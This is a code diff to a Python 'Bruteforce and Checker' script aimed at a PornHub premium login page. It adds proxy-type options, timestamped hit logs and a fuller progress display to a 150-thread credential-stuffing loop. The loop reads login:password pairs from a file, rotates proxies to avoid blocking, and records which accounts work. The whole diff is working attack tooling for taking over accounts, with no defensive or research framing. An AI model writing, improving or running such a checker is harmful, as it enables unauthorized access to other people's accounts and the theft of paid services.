@@ -1,6 +1,7 @@
 import requests
 import sys, os
 import random
+import datetime
 import threading
 import time
 from helpers.colors import bcolors
@@ -16,25 +17,30 @@ class Brute(object):
     def __init__(self):
         self.projectName = "PornHub"
         self.projectFullName = "PornHub Bruteforce and Checker"
-        self.description = "Some desc is here"
+        self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
         self.error = 0
+        self.projerror = 0
+        self.proxytype = "https"
+        self.basename = "log.txt"
+        self.proxyname = "proxy.txt"
         self.captcha = 0
         self.running = True
         self.timeout = 15
         self.thread_count = 150
+        self.today = datetime.datetime.today()
         self.lines = []
         self.lock = threading.Lock()
         self.count_list = 0
 
     def check(self, login, password):
         try:
-            proxies = {
-                'https': self.getproxy()
-                #BURP
-                #'https': '127.0.0.1:8080'
-            }
+            if self.proxytype != "burp":
+                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
+            else:
+                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
+
             r = requests.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout)
             site = soup(r.text, "html.parser")
             token = site.find("input", id="token")
@@ -48,11 +54,11 @@ class Brute(object):
                 self.good += 1
                 #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
             else :
-                self.error += 1
+                self.projerror += 1
         except Exception as e:
             #print("Error is " + str(e))
             self.error += 1
-    
+     
     def stop(self):
         self.running = False
         print("Work ended")
@@ -62,7 +68,7 @@ class Brute(object):
 
 
     def mult(self):
-        with open("log.txt", "r") as tags:
+        with open(self.basename, "r") as tags:
             for line in tags:
                 #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                 self.lines.append(line.strip())
@@ -79,12 +85,11 @@ class Brute(object):
     #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
         while self.running:
             if (len(self.lines) == 0):
-                self.running = False
                 self.stop()
                 break
 
             self.lock.acquire()
-            print( str(len(self.lines)) + "/" + str(self.count_list) + " " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC, end='\r')
+            print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
             sys.stdout.flush()
             trl = self.lines[0]
             self.lines.pop(0)
@@ -104,12 +109,11 @@ class Brute(object):
         self.lock.release()
 
     def getproxy(self):
-        lines = open('proxy.txt').read().splitlines()
-        myline =random.choice(lines)
-        return myline
+        proxyfile = open(self.proxyname).read().splitlines()
+        return random.choice(proxyfile)
 
     def writelog(self, file, log):
-        dirr = self.projectName +"/"+file
+        dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
         os.makedirs(os.path.dirname(dirr), exist_ok=True)
-        with open(dirr, 'w') as the_file:
-            the_file.write(log)
+        with open(dirr, 'a') as the_file:
+            the_file.write(log + '\n')
